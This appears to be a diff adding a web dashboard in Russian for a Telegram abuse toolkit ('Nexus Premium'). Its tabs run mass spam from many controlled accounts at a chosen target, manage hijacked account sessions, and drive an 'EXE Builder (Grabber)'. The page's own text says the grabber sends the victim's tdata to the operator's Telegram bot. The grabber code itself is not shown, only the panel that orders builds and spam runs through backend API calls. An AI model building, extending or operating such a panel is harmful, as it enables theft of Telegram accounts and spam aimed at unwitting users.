@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus Premium | Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        body { background: #08090a; color: #e2e8f0; font-family: 'Outfit', sans-serif; }
+        .glass { background: rgba(17, 25, 40, 0.75); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .sidebar-item { transition: 0.3s; cursor: pointer; border-radius: 8px; }
+        .sidebar-item:hover, .sidebar-item.active { background: #2563eb; color: white; box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4); }
+        .console { font-family: 'JetBrains Mono', monospace; scrollbar-width: thin; }
+        .input-dark { background: #0f172a; border: 1px solid #1e293b; border-radius: 8px; padding: 10px; color: white; outline: none; transition: 0.2s; }
+        .input-dark:focus { border-color: #3b82f6; box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
+        [v-cloak] { display: none; }
+    </style>
+</head>
+<body class="h-screen flex overflow-hidden">
+
+<div id="app" v-cloak class="flex w-full h-full">
+    <aside class="w-72 glass m-4 rounded-2xl p-6 flex flex-col gap-6">
+        <div class="flex items-center gap-3 px-2">
+            <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center font-bold text-xl shadow-lg shadow-blue-500/30">N</div>
+            <h1 class="text-xl font-bold tracking-tight">Nexus <span class="text-blue-500">Premium</span></h1>
+        </div>
+
+        <nav class="flex-1 space-y-2">
+            <div v-for="(tab, id) in tabs" :key="id"
+                 @click="currentTab = id"
+                 :class="['sidebar-item p-3 flex items-center gap-3', currentTab === id ? 'active' : 'text-gray-400']">
+                <span>{{ tab.icon }}</span> {{ tab.name }}
+            </div>
+        </nav>
+
+        <div class="glass p-4 rounded-xl border-blue-500/20">
+            <div class="text-xs text-gray-500 uppercase font-bold mb-2">Активные сессии</div>
+            <div class="text-2xl font-bold text-blue-400">{{ sessions.length }}</div>
+        </div>
+    </aside>
+
+    <main class="flex-1 flex flex-col p-4 pl-0 gap-4 overflow-hidden">
+        <div class="flex-1 flex gap-4 overflow-hidden">
+
+            <section class="flex-[2] glass rounded-2xl p-6 overflow-y-auto">
+                <div v-if="currentTab === 'spam'" class="space-y-4">
+                    <h2 class="text-2xl font-bold mb-6">🚀 Массовая Рассылка</h2>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="flex flex-col gap-2">
+                            <label class="text-sm text-gray-400">Цель (Username/ID)</label>
+                            <input v-model="forms.spam.target" class="input-dark" placeholder="@durov">
+                        </div>
+                        <div class="flex flex-col gap-2">
+                            <label class="text-sm text-gray-400">Задержка (сек)</label>
+                            <input type="number" v-model="forms.spam.delay" class="input-dark">
+                        </div>
+                    </div>
+                    <div class="flex flex-col gap-2">
+                        <label class="text-sm text-gray-400">Сообщение (Поддерживает SpinTax: {Hi|Hello})</label>
+                        <textarea v-model="forms.spam.text" rows="5" class="input-dark resize-none" placeholder="Привет, {как дела|что делаешь}?"></textarea>
+                    </div>
+                    <div class="flex items-center gap-4">
+                        <label class="flex items-center gap-2 cursor-pointer">
+                            <input type="checkbox" v-model="forms.spam.loop" class="w-4 h-4 rounded border-gray-300">
+                            <span>Зациклить</span>
+                        </label>
+                        <button @click="runAction('spam')" class="bg-blue-600 hover:bg-blue-700 px-8 py-3 rounded-xl font-bold transition flex-1">ЗАПУСТИТЬ</button>
+                    </div>
+                </div>
+
+                <div v-if="currentTab === 'build'" class="space-y-4">
+                    <h2 class="text-2xl font-bold mb-6">🛠️ EXE Builder (Grabber)</h2>
+                    <div class="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-xl text-yellow-200 text-sm">
+                        Билдер создаст файл, который при запуске отправит tdata жертвы в ваш Telegram бот.
+                    </div>
+                    <div class="flex flex-col gap-2">
+                        <label class="text-sm text-gray-400">Bot Token</label>
+                        <input v-model="forms.build.bot_token" class="input-dark" placeholder="55234...:AAH_...">
+                    </div>
+                    <div class="flex flex-col gap-2">
+                        <label class="text-sm text-gray-400">Your Chat ID</label>
+                        <input v-model="forms.build.chat_id" class="input-dark" placeholder="12345678">
+                    </div>
+                    <button @click="buildExe" :disabled="loading" class="w-full bg-white text-black py-3 rounded-xl font-bold hover:bg-gray-200 transition">
+                        {{ loading ? 'СБОРКА...' : 'СОЗДАТЬ ГРАББЕР' }}
+                    </button>
+                    <div v-if="buildUrl" class="mt-4 p-4 glass border-green-500/30 text-center">
+                        <p class="text-green-400 mb-2">Сборка готова!</p>
+                        <a :href="buildUrl" class="text-blue-400 underline font-mono">{{ buildUrl }}</a>
+                    </div>
+                </div>
+
+                <div v-if="currentTab === 'sessions'" class="space-y-4">
+                    <div class="flex justify-between items-center mb-6">
+                        <h2 class="text-2xl font-bold">📂 Управление сессиями</h2>
+                        <button @click="loadSessions" class="text-sm bg-gray-800 px-3 py-1 rounded">Обновить</button>
+                    </div>
+                    <div class="grid grid-cols-1 gap-2">
+                        <div v-for="s in sessions" :key="s.name" class="flex items-center justify-between glass p-3 rounded-xl border-white/5">
+                            <div class="flex items-center gap-3">
+                                <div class="w-2 h-2 bg-green-500 rounded-full"></div>
+                                <span class="font-mono">{{ s.name }}</span>
+                            </div>
+                            <button @click="deleteSession(s.name)" class="text-red-500 hover:bg-red-500/10 px-3 py-1 rounded transition">Удалить</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="flex-1 glass rounded-2xl flex flex-col overflow-hidden border-blue-500/10">
+                <div class="p-4 border-b border-white/5 flex justify-between items-center bg-white/5">
+                    <span class="text-xs font-bold uppercase tracking-widest text-blue-400">Live Terminal</span>
+                    <button @click="logs = []" class="text-[10px] text-gray-500 hover:text-white uppercase">Clear</button>
+                </div>
+                <div class="console flex-1 p-4 overflow-y-auto text-xs space-y-1 bg-black/20">
+                    <div v-for="(log, i) in logs" :key="i" class="border-l-2 border-blue-500/50 pl-2 py-0.5 animate-in slide-in-from-left-2 duration-300">
+                        <span class="text-gray-500">[{{ i }}]</span> {{ log }}
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+</div>
+
+<script>
+    const { createApp } = Vue;
+
+    createApp({
+        data() {
+            return {
+                currentTab: 'spam',
+                loading: false,
+                buildUrl: null,
+                sessions: [],
+                logs: [],
+                tabs: {
+                    spam: { name: 'Спаммер', icon: '🚀' },
+                    sessions: { name: 'Сессии', icon: '📂' },
+                    join: { name: 'Инвайтер', icon: '🔗' },
+                    react: { name: 'Реактор', icon: '🔥' },
+                    build: { name: 'Билдер', icon: '🛠️' }
+                },
+                forms: {
+                    spam: { target: '', text: '', delay: 5, loop: false },
+                    build: { bot_token: '', chat_id: '' }
+                }
+            }
+        },
+        mounted() {
+            this.loadSessions();
+            this.initWS();
+        },
+        methods: {
+            async loadSessions() {
+                const r = await fetch('/api/sessions');
+                this.sessions = await r.json();
+            },
+            async runAction(type) {
+                const accs = this.sessions.map(s => s.name);
+                await fetch(`/api/${type}/run`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ ...this.forms[type], accounts: accs })
+                });
+            },
+            async buildExe() {
+                this.loading = true; this.buildUrl = null;
+                try {
+                    const r = await fetch('/api/build', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(this.forms.build)
+                    });
+                    const d = await r.json();
+                    if(d.url) this.buildUrl = d.url;
+                    else alert("Ошибка: " + d.message);
+                } finally { this.loading = false; }
+            },
+            async deleteSession(name) {
+                if(!confirm(`Удалить ${name}?`)) return;
+                await fetch(`/api/sessions/${name}`, { method: 'DELETE' });
+                this.loadSessions();
+            },
+            initWS() {
+                const ws = new WebSocket(`ws://${location.host}/ws/logs`);
+                ws.onmessage = (e) => {
+                    this.logs.push(e.data);
+                    setTimeout(() => {
+                        const c = document.querySelector('.console');
+                        c.scrollTop = c.scrollHeight;
+                    }, 50);
+                };
+                ws.onclose = () => setTimeout(this.initWS, 2000);
+            }
+        }
+    }).mount('#app');
+</script>
+</body>
+</html>
